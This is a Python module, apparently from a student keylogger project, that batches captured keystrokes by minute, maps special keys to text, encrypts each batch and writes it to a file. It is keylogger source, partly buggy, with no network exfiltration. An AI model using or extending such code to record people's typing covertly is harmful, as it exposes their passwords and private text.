#" המטרה: הקלאס מקבל כל פעם אות אחת מקילוגר, עוטף את המלל של כל דקה ושולח אותו עם חותמת זמן לקלאס הבא של ההצפנה

from time import sleep
# from datetime import datetime
# import tzlocal  # צריך להתקין עם: pip install tzlocal
#
#
# class Manager:
#     def __init__(self):
#         self.my_dict = {}
#         self.my_str = ""
#         self.time = self.get_time()
#
#     def get_time(self):
#         local_timezone = tzlocal.get_localzone()
#         local_time = datetime.now(local_timezone)
#         formatted_time = local_time.strftime("%Z %d/%m/%Y %H:%M")
#         return formatted_time
#
#     def key_to_char(self,key):
#         key = str(key)#.replace("'", "")
#         if key == 'Key.space':
#             key = ' '
#         if key == 'Key.enter':
#             key = '\n'
#         if key == 'Key.up':
#             key = ' Key.up '
#         if key == 'Key.right':
#             key = ' Key.right '
#         if key == 'Key.left':
#             key = ' Key.left '
#         if key == 'Key.down':
#             key = ' Key.down '
#         if key == 'Key.ctrl_l':
#             key = ' ctrl '
#         if key == '\\x03':
#             key = ' copy '
#         if key == 'Key.backspace':
#             key = ''
#         if key == '\\x18':
#             key = 'cut '
#         if key == '\\x16':
#             key = 'paste '
#         if key == '<96>':
#             key = 0
#         if key == '<97>':
#             key = 1
#         if key == '<98>':
#             key = 2
#         if key == '<99>':
#             key = 3
#         if key == '<100>':
#             key = 4
#         if key == '<101>':
#             key = 5
#         if key == '<102>':
#             key = 6
#         if key == '<103>':
#             key = 7
#         if key == '<104>':
#             key = 8
#         if key == '<105>':
#             key = 9
#
#         return self.char_to_dict(key)
#
#
#     def char_to_dict(self,key):
#         if self.get_time() == self.time:
#             self.my_str += key
#         else:
#             self.my_dict = {}
#             self.my_dict[self.time] = self.my_str
#             self.my_str = ""
#             self.time = self.get_time()
#             print(self.my_dict)
#             return self.my_dict

from datetime import datetime
import tzlocal  # צריך להתקין עם: pip install tzlocal
from Cipher import Cipher

class Manager:
    def __init__(self,keylogger_system,writer):
        self.my_dict = {}
        self.time = self.get_time()
        self.keylogger_system = keylogger_system
        self.writer = writer
        self.encryptor = Cipher()


    def run(self):
        if self.time != self.get_time():
            ls = self.keylogger_system.get_logged_keys()
            if ls != []:
                for i in ls:
                    self.key_to_char(i)
                self.my_dict = {}
                self.my_dict[self.time] = ls
                self.time = self.get_time()
                encrypt_data = self.encryptor.cipher(self.my_dict)
                self.writer.write_to_file(encrypt_data)


    def get_time(self):
        local_timezone = tzlocal.get_localzone()
        local_time = datetime.now(local_timezone)
        formatted_time = local_time.strftime("%Z %d/%m/%Y %H:%M")
        return formatted_time

    def key_to_char(self,key):

        key = str(key)#.replace("'", "")
        if key == 'Key.space':
            key = ' '
        elif key == 'Key.enter':
            key = '\n'
        elif key == 'Key.up':
            key = ' Key.up '
        elif key == 'Key.right':
            key = ' Key.right '
        elif key == 'Key.left':
            key = ' Key.left '
        elif key == 'Key.down':
            key = ' Key.down '
        elif key == 'Key.ctrl_l':
            key = ' ctrl '
        elif key == '\\x03':
            key = ' copy '
        elif key == 'Key.backspace':
            key = ''
        elif key == '\\x18':
            key = 'cut '
        elif key == '\\x16':
            key = 'paste '
        elif key == '<96>':
            key = 0
        elif key == '<97>':
            key = 1
        elif key == '<98>':
            key = 2
        elif key == '<99>':
            key = 3
        elif key == '<100>':
            key = 4
        elif key == '<101>':
            key = 5
        elif key == '<102>':
            key = 6
        elif key == '<103>':
            key = 7
        elif key == '<104>':
            key = 8
        elif key == '<105>':
            key = 9




    def char_to_dict(self,):
        self.my_dict = {}
        self.my_dict[self.time] = self.my_str
        self.time = self.get_time()
        print(self.my_dict)
        return self.my_dict
#
#
# m = Manager()
# m.key_to_char("a")
# sleep(5)
# m.key_to_char("a")
# sleep(5)
#
# m.key_to_char("a")
# sleep(5)
#
# m.key_to_char("a")
# sleep(5)
#
# m.key_to_char("a")
# sleep(5)
#
# m.key_to_char("a")
# sleep(5)
#
# m.key_to_char("adfgj")
# sleep(5)
#
# m.key_to_char("a")
# sleep(10)
#
# m.key_to_char("a")
# sleep(10)
#
# m.key_to_char("a")
# sleep(10)
#
# m.key_to_char("aghh")
# sleep(10)
#
# m.key_to_char("a")
# sleep(10)
#
# m.key_to_char("a")
# sleep(10)

